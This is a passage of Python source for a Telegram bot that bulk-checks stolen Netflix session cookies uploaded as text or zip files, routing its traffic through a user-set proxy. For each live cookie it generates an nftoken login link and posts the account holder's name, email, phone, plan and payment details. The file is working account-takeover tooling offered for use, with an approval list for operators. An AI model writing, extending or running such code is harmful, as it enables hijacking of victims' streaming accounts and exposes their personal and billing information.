                f"• Quality: {acct.get('video_quality', 'HD')}\n"
                f"• Streams: {acct.get('max_streams', '2')}\n"
                f"• Extra Member: {acct.get('extra_member', 'No')}\n"
                f"• Extra Member Slot: Unknown\n"
                f"• Email Verified: {acct.get('email_verified', 'No')}\n"
                f"• Membership Status: {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
                f"• Connected Profiles: {acct.get('connected_profiles', '1')}\n"
                f"• Profiles: {acct.get('profiles', 'Unknown')}"
            )

            keyboard = [
                [
                    InlineKeyboardButton("💻 PC Login", url=desktop_link),
                    InlineKeyboardButton("📱 Phone Login", url=phone_link)
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await msg.edit_text(
                formatted_text,
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
            logger.info(f"✅ Cookie validation successful for {user_id}")
        else:
            await msg.edit_text(f"❌ {detail}")
            logger.warning(f"❌ Cookie validation failed for {user_id}: {detail}")
    except Exception as e:
        logger.error(f"Error in handle_cookie_text: {e}", exc_info=True)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    filename = document.file_name or "document"
    
    # 1. Silently ignore non-cookie document uploads (PDFs, Images, MP3s, etc.)
    if not filename.endswith(('.txt', '.zip')):
        return

    # 2. Enforce access control for cookie files
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text(
            f"🚫 Access Denied!\nYour Telegram User ID is `{user_id}`.\nContact owner for access.", 
            parse_mode="Markdown"
        )
        return

    if not CURRENT_PROXY:
        await update.message.reply_text(
            "⚠️ **Proxy Required!**\n\n"
            "You must set a live proxy before uploading files to check.\n"
            "Use `/addproxy` to set one.",
            parse_mode="Markdown"
        )
        return

    cancel_bulk_event.clear()
    status_msg = await update.message.reply_text(f"📥 Downloading `{filename}`...")

    temp_dir = tempfile.mkdtemp()
    file_path = os.path.join(temp_dir, filename)

    try:
        tg_file = await context.bot.get_file(document.file_id)
        await tg_file.download_to_drive(file_path)

        raw_files = []
        if filename.endswith('.zip'):
            with zipfile.ZipFile(file_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            for root, _, files in os.walk(temp_dir):
                for f in files:
                    if f.endswith('.txt'):
                        raw_files.append(os.path.join(root, f))
        else:
            raw_files.append(file_path)

        cookie_queue = []
        for f_path in raw_files:
            try:
                with open(f_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                extracted = _split_multiple_cookies(content)
                fname = os.path.basename(f_path)
                for idx, c_text in enumerate(extracted, start=1):
                    tag = f"{fname} (Cookie #{idx})" if len(extracted) > 1 else fname
                    cookie_queue.append((tag, c_text))
            except Exception as e:
                logger.error(f"Error reading {f_path}: {e}")

        total_cookies = len(cookie_queue)
        valid_count = 0
        dead_count = 0
        last_update_time = time.time()

        await status_msg.edit_text(
            f"🔄 Starting Bulk Check...\n\n"
            f"📦 File: `{filename}`\n"
            f"📊 Total Cookies: {total_cookies}\n"
            f"⏳ Progress: 0/{total_cookies} (0%)\n"
            f"🟢 Valid: 0 | 🔴 Dead: 0\n\n"
            f"Send /stop to halt anytime.",
            parse_mode="Markdown"
        )

        loop = asyncio.get_running_loop()

        for idx, (display_name, cookie_raw) in enumerate(cookie_queue, start=1):
            await asyncio.sleep(0.01)

            if cancel_bulk_event.is_set():
                logger.info("Bulk check cancelled by user via /stop")
                break

            current_time = time.time()
            if idx % 3 == 0 or (current_time - last_update_time) > 2.0 or idx == total_cookies:
                percent = int((idx / total_cookies) * 100)
                try:
                    await status_msg.edit_text(
                        f"🔄 Checking Cookies...\n\n"
                        f"📦 File: `{filename}`\n"
                        f"📊 Total: {total_cookies}\n"
                        f"⏳ Progress: {idx}/{total_cookies} ({percent}%)\n"
                        f"🟢 Valid: {valid_count} | 🔴 Dead: {dead_count}\n\n"
                        f"Send /stop to halt anytime.",
                        parse_mode="Markdown"
                    )
                    last_update_time = current_time
                except Exception:
                    pass

            try:
                cookie_header = _build_cookie_header(cookie_raw)
                if not cookie_header:
                    dead_count += 1
                    continue

                ok, detail, nftoken = await loop.run_in_executor(None, _generate_nftoken, cookie_header)

                if cancel_bulk_event.is_set():
                    logger.info("Bulk check cancelled post-nftoken via /stop")
                    break

                if ok and nftoken:
                    acct = await loop.run_in_executor(None, _check_netflix_cookie, cookie_header)
                    
                    if cancel_bulk_event.is_set():
                        logger.info("Bulk check cancelled post-account-check via /stop")
                        break

                    phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}"
                    desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}"

                    formatted_text = (
                        f"📁 Source:\n{display_name}\n"
                        f"✅ Status: Valid Premium Account\n\n"
                        f"👤 Account Details:\n"
                        f"• Name: {acct.get('name', 'Unknown')}\n"
                        f"• Email: {acct.get('email', 'Unknown')}\n"
                        f"• Country: {acct.get('country', 'Unknown')}\n"
                        f"• Plan: {acct.get('plan', 'Unknown')}\n"
                        f"• Price: {acct.get('plan_price', 'N/A')}\n"
                        f"• Member Since: {acct.get('member_since', 'Unknown')}\n"
                        f"• Next Billing: {acct.get('next_billing', 'Unknown')}\n"
                        f"• Payment: {acct.get('payment_method', 'CC')}\n"
                        f"• Payment Status: {acct.get('payment_status', 'Active / Paid')}\n"
                        f"• Phone: {acct.get('phone', 'N/A')} ({acct.get('has_phone', 'No')})\n"
                        f"• Quality: {acct.get('video_quality', 'HD')}\n"
                        f"• Streams: {acct.get('max_streams', '2')}\n"
                        f"• Extra Member: {acct.get('extra_member', 'No')}\n"
                        f"• Extra Member Slot: Unknown\n"
                        f"• Email Verified: {acct.get('email_verified', 'No')}\n"
                        f"• Membership Status: {acct.get('membership_status', 'CURRENT_MEMBER')}\n"
                        f"• Connected Profiles: {acct.get('connected_profiles', '1')}\n"
                        f"• Profiles: {acct.get('profiles', 'Unknown')}"
                    )

                    keyboard = [
                        [
                            InlineKeyboardButton("💻 PC Login", url=desktop_link),
                            InlineKeyboardButton("📱 Phone Login", url=phone_link)
                        ]
                    ]
                    reply_markup = InlineKeyboardMarkup(keyboard)

                    await update.message.reply_text(
                        formatted_text,
                        reply_markup=reply_markup,
                        disable_web_page_preview=True
                    )
                    valid_count += 1
                else:
                    dead_count += 1
            except Exception as e:
                logger.error(f"Error checking {display_name}: {e}")
                dead_count += 1

        if cancel_bulk_event.is_set():
            await status_msg.edit_text(
                f"🛑 **Bulk Check Stopped Manually!**\n\n"
                f"📊 Final Progress: {idx}/{total_cookies}\n"
                f"🟢 Valid Found: {valid_count}\n"
                f"🔴 Dead / Invalid: {dead_count}",
                parse_mode="Markdown"
            )
        else:
            await status_msg.edit_text(
                f"✅ **Bulk Check Completed!**\n\n"
                f"📊 Checked: {total_cookies}/{total_cookies} (100%)\n"
                f"🟢 Valid Found: {valid_count}\n"
                f"🔴 Dead / Invalid: {dead_count}",
                parse_mode="Markdown"
            )

    except Exception as e:
        logger.error(f"Error handling document: {e}")
        await status_msg.edit_text(f"❌ Error processing document: {e}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


# ========== MAIN THREAD LOOP ==========
def run_bot_in_thread():
    global application
    
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set!")
        return
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    try:
        application = ApplicationBuilder().token(BOT_TOKEN).concurrent_updates(True).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("addproxy", addproxy_command))
        application.add_handler(CommandHandler("stop", stop_command, block=False))
        application.add_handler(CommandHandler("approve", approve_command))
        application.add_handler(CommandHandler("disapprove", disapprove_command))
        application.add_handler(CommandHandler("approved", approved_list_command))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_text))
        
        loop.run_until_complete(
            application.run_polling(
                allowed_updates=Update.ALL_TYPES,
                stop_signals=()
            )
        )
    except Exception as e:
        logger.error(f"❌ Bot runtime error: {e}")
        application = None
    finally:
        try:
            loop.run_until_complete(loop.shutdown_asyncgens())
            loop.close()
        except Exception:
            pass


if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN environment variable is not set!")
        sys.exit(1)
    
    bot_thread = Thread(target=run_bot_in_thread, daemon=True)
    bot_thread.start()
    
    time.sleep(2)
    
    try:
        logger.info(f"🚀 Starting Flask server on port {PORT}\n")
        app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
    except OSError as e:
        logger.warning(f"⚠️ Port {PORT} busy ({e}), retrying on fallback port 8080...")
        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)
    except (KeyboardInterrupt, SystemExit):
        logger.info("🛑 Shutting down server gracefully...")
        sys.exit(0)
